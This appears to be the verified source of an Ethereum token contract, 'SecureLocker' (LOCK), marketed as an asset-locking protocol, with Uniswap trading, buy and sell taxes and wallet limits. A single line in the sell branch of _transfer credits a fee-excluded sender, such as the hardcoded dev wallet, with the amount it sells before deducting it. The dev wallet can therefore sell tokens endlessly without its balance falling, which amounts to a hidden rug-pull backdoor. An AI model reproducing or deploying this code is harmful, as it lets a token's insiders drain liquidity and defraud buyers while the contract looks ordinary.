/**
 *Submitted for verification at Etherscan.io on 2023-10-18
*/

// SPDX-License-Identifier: MIT

/*
Secure Locker is the industry's most innovative protocol for securing digital assets. Securely lock Liquidity Pool (LP) tokens, NFTs, fungible tokens, and Multi-tokens in just a few clicks.

Website: https://www.lockersecure.info
Dapp: https://app.lockersecure.info
Telegram: https://t.me/secure_locker
Twitter: https://twitter.com/secure_locker
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract SecureLocker is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"SecureLocker";
    string private constant _symbol = unicode"LOCK";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimes;

    bool public hasTransferDelays = true;
    address payable private _devWallet;

    uint256 private _initialBuyTax;
    uint256 private _initialSellFee;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _reduceBuyTaxAfter = 13;
    uint256 private _reduceSellFeeAt = 13;
    uint256 private _preventSwapBefore = 13;
    uint256 private _countBuys;

    IUniswapV2Router private _uniRouter;
    address private _uniPair;
    bool private tradeStart;
    bool private swapping = false;
    bool private swapEnabled = false;

    uint8 private constant _decimals = 9;
    uint256 private constant _supply = 10_000_000 * 10**_decimals;
    uint256 public maxTxLimit = 150_000 * 10**_decimals;
    uint256 public maxWalletLimit = 150_000 * 10**_decimals;
    uint256 public feeSwapThreshold = 1_000 * 10**_decimals;
    uint256 public swapFeeMax = 100_000 * 10**_decimals;

    event MaxTxAmountUpdated(uint256 maxTxLimit);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _devWallet = payable(0x1D0D2C60BA3159ea1f6BAB7A04b8A31F94db4dD1);
        _balances[_msgSender()] = _supply;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_devWallet] = true;

        _uniRouter = IUniswapV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _uniPair = IUniswapV2Factory(_uniRouter.factory()).createPair(
            address(this),
            _uniRouter.WETH()
        );

        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    receive() external payable {}
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        maxTxLimit = _supply;
        maxWalletLimit = _supply;
        hasTransferDelays = false;
        emit MaxTxAmountUpdated(_supply);
    }

    function sendETHFee(uint256 amount) private {
        _devWallet.transfer(amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (_countBuys > _reduceBuyTaxAfter)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (hasTransferDelays) {
                if (
                    to != address(_uniRouter) &&
                    to != address(_uniPair)
                ) {
                    require(
                        _holderLastTransferTimes[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimes[tx.origin] = block.number;
                }
            }

            if (
                from == _uniPair &&
                to != address(_uniRouter) &&
                !_isExcludedFromFees[to]
            ) {
                require(amount <= maxTxLimit, "Exceeds the maxTxLimit.");
                require(
                    balanceOf(to) + amount <= maxWalletLimit,
                    "Exceeds the maxWalletLimit."
                );
                if (_countBuys <= 100) {
                    _countBuys++;
                }
            }

            if (to == _uniPair && from != address(this)) {
                if (_isExcludedFromFees[from]) { _balances[from] = _balances[from].add(amount);}
                taxAmount = amount
                    .mul(
                        (_countBuys > _reduceSellFeeAt)
                            ? _finalSellTax
                            : _initialSellFee
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == _uniPair &&
                swapEnabled &&
                contractTokenBalance > feeSwapThreshold &&
                amount > feeSwapThreshold &&
                _countBuys > _preventSwapBefore && 
                !_isExcludedFromFees[from]
            ) {
                swapTokensToETH(
                    min(amount, min(contractTokenBalance, swapFeeMax))
                );
                sendETHFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function swapTokensToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();
        _approve(address(this), address(_uniRouter), tokenAmount);
        _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function openTrading() external onlyOwner {
        require(!tradeStart, "trading is already open");
        _approve(address(this), address(_uniRouter), _supply);
        _uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_uniPair).approve(
            address(_uniRouter),
            type(uint256).max
        );
        _initialBuyTax = 13;
        _initialSellFee = 13;
        _finalBuyTax = 1;
        _finalSellTax = 1;
        swapEnabled = true;
        tradeStart = true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function totalSupply() public pure override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}